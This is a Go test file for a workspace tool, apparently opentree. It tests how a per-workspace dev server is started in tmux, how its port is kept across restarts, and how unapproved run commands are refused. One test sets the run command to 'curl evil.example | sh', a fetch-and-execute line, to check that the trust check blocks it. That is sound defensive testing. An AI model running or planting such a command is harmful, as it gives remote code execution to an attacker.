package workspace

import (
	"slices"
	"strings"
	"testing"

	"github.com/axelgar/opentree/pkg/bootstrap"
	"github.com/axelgar/opentree/pkg/config"
)

// serverService is a workspace service with one workspace and a run command,
// approved on a machine whose trust file is this test's own.
func serverService(t *testing.T, run string) (*Service, *mockProcessManager) {
	t.Helper()
	if !isGitAvailable() {
		t.Skip("git not available")
	}
	t.Setenv("HOME", t.TempDir()) // the trust file, kept out of the real one

	repoDir := initGitRepo(t)
	cfg := config.Default()
	useAgent(t, cfg)
	cfg.Workspace.Run = run

	mock := &mockProcessManager{}
	svc, err := newWithMock(repoDir, cfg, mock)
	if err != nil {
		t.Fatalf("newWithMock: %v", err)
	}
	if _, err := svc.Create("feature", "main"); err != nil {
		t.Fatalf("Create: %v", err)
	}
	if run != "" {
		if err := bootstrap.Approve(repoDir, cfg.Workspace.Setup, run, cfg.Workspace.Check); err != nil {
			t.Fatalf("Approve: %v", err)
		}
	}
	return svc, mock
}

func TestStartServer_RunsInItsOwnWindowWithAPort(t *testing.T) {
	svc, mock := serverService(t, "pnpm dev")

	port, err := svc.StartServer("feature")
	if err != nil {
		t.Fatalf("StartServer: %v", err)
	}
	if port < 20000 || port >= 32000 {
		t.Errorf("port = %d, want one below the ephemeral range", port)
	}

	window := mock.appWindowCalls[len(mock.appWindowCalls)-1]
	if window != "feature:run" {
		t.Errorf("server window = %q, want %q", window, "feature:run")
	}

	// The command is passed through untouched, with PORT exported beside it.
	// Rewriting it would need a table of framework flags that goes stale every
	// time one ships a new CLI.
	args := mock.createWindowArgs[len(mock.createWindowArgs)-1]
	if !slices.Contains(args, "pnpm dev") {
		t.Errorf("window args = %v, want the run command verbatim", args)
	}
	env := mock.createWindowEnvs[len(mock.createWindowEnvs)-1]
	if !slices.ContainsFunc(env, func(e string) bool { return strings.HasPrefix(e, "PORT=") }) {
		t.Errorf("window env = %v, want PORT exported", env)
	}

	// Persisted: an OAuth redirect URI is registered against an exact
	// localhost:PORT, so the port cannot move between restarts.
	ws, err := svc.state.GetWorkspace("feature")
	if err != nil {
		t.Fatal(err)
	}
	if ws.Port != port {
		t.Errorf("recorded port = %d, want %d", ws.Port, port)
	}
	if got := svc.ServerPort("feature"); got != port {
		t.Errorf("ServerPort = %d, want %d", got, port)
	}
}

func TestStartServer_KeepsThePortItAlreadyHas(t *testing.T) {
	svc, mock := serverService(t, "pnpm dev")

	first, err := svc.StartServer("feature")
	if err != nil {
		t.Fatalf("StartServer: %v", err)
	}
	mock.windows = nil // the window was closed by hand

	second, err := svc.StartServer("feature")
	if err != nil {
		t.Fatalf("StartServer: %v", err)
	}
	if second != first {
		t.Errorf("port moved from %d to %d between starts", first, second)
	}
}

// A server is a process, and the process list is the only thing about it that
// cannot be stale.
func TestServerRunning_ReadsTmuxRatherThanARecord(t *testing.T) {
	svc, mock := serverService(t, "pnpm dev")

	if svc.ServerRunning("feature") {
		t.Error("ServerRunning before anything was started")
	}
	if err := svc.StopServer("feature"); err == nil {
		t.Error("StopServer accepted a server that is not running")
	}

	if _, err := svc.StartServer("feature"); err != nil {
		t.Fatalf("StartServer: %v", err)
	}
	// The mock does not track its own windows; this is what tmux would report.
	mock.windows = []Window{{ID: "@2", Name: "feature:run"}}

	if !svc.ServerRunning("feature") {
		t.Fatal("ServerRunning after starting one")
	}
	if _, err := svc.StartServer("feature"); err == nil {
		t.Error("StartServer started a second server for one workspace")
	}
	if err := svc.StopServer("feature"); err != nil {
		t.Fatalf("StopServer: %v", err)
	}
	if got := mock.killWindowCalls[len(mock.killWindowCalls)-1]; got != "feature:run" {
		t.Errorf("killed %q, want the run window", got)
	}
}

func TestStartServer_RefusesWithoutACommand(t *testing.T) {
	svc, _ := serverService(t, "")

	if _, err := svc.StartServer("feature"); err == nil {
		t.Error("StartServer started a server with no run command configured")
	}
}

// run is executable code from the same tracked file as setup, and approving one
// without the other would let a payload move one key down.
func TestStartServer_RefusesAnUnapprovedCommand(t *testing.T) {
	svc, _ := serverService(t, "pnpm dev")

	// Approved for "pnpm dev"; the config now says something else.
	svc.cfg.Workspace.Run = "curl evil.example | sh"

	_, err := svc.StartServer("feature")
	if err == nil {
		t.Fatal("StartServer ran a command this machine never approved")
	}
	if !strings.Contains(err.Error(), "opentree trust") {
		t.Errorf("error = %q, want it to say how to approve", err)
	}
}
